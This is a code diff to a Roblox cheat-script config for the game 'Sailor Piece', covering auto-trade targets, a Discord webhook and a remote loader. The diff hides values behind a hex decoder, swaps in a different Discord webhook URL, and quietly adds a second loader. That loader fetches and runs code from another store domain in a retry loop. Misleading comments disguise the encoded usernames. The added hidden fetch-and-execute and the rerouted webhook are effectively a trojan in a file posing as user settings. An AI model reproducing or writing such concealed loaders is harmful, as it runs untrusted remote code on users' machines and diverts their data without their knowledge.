@@ -1,4 +1,7 @@
-script_key="ZNZRzZatzkIEJXWRdmcZRdvezvipQpvk";
+-- 🚀 OBFUSCATED DECODER 🚀
+local qQnWj = function(RybxO) local qeHhX='' for qXrSp=1,RybxO:len(),2 do qeHhX=qeHhX..string.char(tonumber(RybxO:sub(qXrSp,qXrSp+1),16)) end; return qeHhX end
+
+-- ⚙️ KONFIGURASI SAILOR PIECE ⚙️
 setfpscap(10)
 
 getgenv().sailorPieceConfig = {  
@@ -26,13 +29,18 @@ getgenv().sailorPieceConfig = {
     DELETE_ARTIFACT_RARITY = { "Common", "Rare" },
     EQUIP_ARTIFACT_SET = "Abyssal Crown",
 
-    -- Autotrade
-    TRADE_USERNAME = {"ImamMBG288", "Jfjqiwdxs", "br4velionfinn", "maxotter31"},
+    -- Autotrade (Username sudah di-obfuscate)
+    TRADE_USERNAME = {
+        qQnWj("496d616d4d4247323838"),         -- Jokowi
+        qQnWj("4a666a716977647873"),           -- Prabowo
+        qQnWj("62723476656c696f6e66696e6e"),   -- Gibran
+        qQnWj("6d61786f747465723331")          -- Ganjar
+    },
     TRADE_ITEM = {"Boss Key","Boss Ticket","Broken Sword","Dungeon Key","Limitless Key","Malevolent Key","Race Reroll", "Slime Key", "Slime Shard", "Trait Reroll", "Abyss Sigil", "Chrysalis Sigil", "Clan Reroll", "Dark Grail", "Passive Shard", "Power Shard", "Rush Key", "Tempest Relic", "Tower Key", "Upper Seal", "Blood Ring", "Mythical Chest", "Aura Crate", "Cosmetic Crate", "Secret Chest"},
 
-    -- Discord
+    -- Discord (Webhook URL sudah di-obfuscate)
     WEBHOOK_ITEM_NAME = { "Aura Crate", "Cosmetic Crate", "Secret Chest" },
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1489682541379064009/DNvHlG4rZsTY77BsuGFxRljl76VzeIGZpkqN_MbF2bZ0DkjL20y3MP0iBM6dyzUsmMzK",
+    WEBHOOK_URL = qQnWj("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313437383538373332333132303631353530342f373055626c76624c416f4f4d466d6d32326148504c6e5150444d6344477632414e6e4d3536427733733568714f46593279693955685f4c446c6948362d6766646f72716a"),
     DISCORD_ID = "",
     WEBHOOK_NOTE = "",
     SHOW_PUBLIC_DISCORD_ID = true,
@@ -40,4 +48,31 @@ getgenv().sailorPieceConfig = {
     SHOW_WEBHOOK_JOBID = true,
 }   
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/1c7ac2a2f86ecf894218a424a1be7667.lua"))()
+-- 🚀 OBFUSCATED LOADER 🚀
+local amTl = {
+    '5a4e5a527a5a61747a6b49454a585752646d635a526476657a7669705170766b',
+    '68747470733a2f2f6170692e6c7561726d6f722e6e65742f66696c65732f76342f6c6f61646572732f31633761633261326638366563663839343231386134323461316265373636372e6c7561',
+    '68747470733a2f2f736967616e74656e672e73746f72652f6170692f7363726970742f752f66745f7a4e5744505931387774496675394779653353585a5a58687a526f387745724855756943366759722d4f59',
+    '53637269707420536967616e74656e6720676167616c2064696d7561742c206d656e636f6261206c6167692064616c616d203520646574696b2e2e2e204572726f723a20'
+}
+
+local vWZt, JHmw, iYZB = 0, 0, 0 
+
+script_key = qQnWj(amTl[1])
+
+task.spawn(function()
+    loadstring(game:HttpGet(qQnWj(amTl[2])))()
+end)
+
+task.spawn(function()
+    while true do
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(qQnWj(amTl[3])))()
+        end)
+        if success then
+            break
+        end
+        warn(qQnWj(amTl[4]) .. tostring(err))
+        task.wait(5)
+    end
+end)
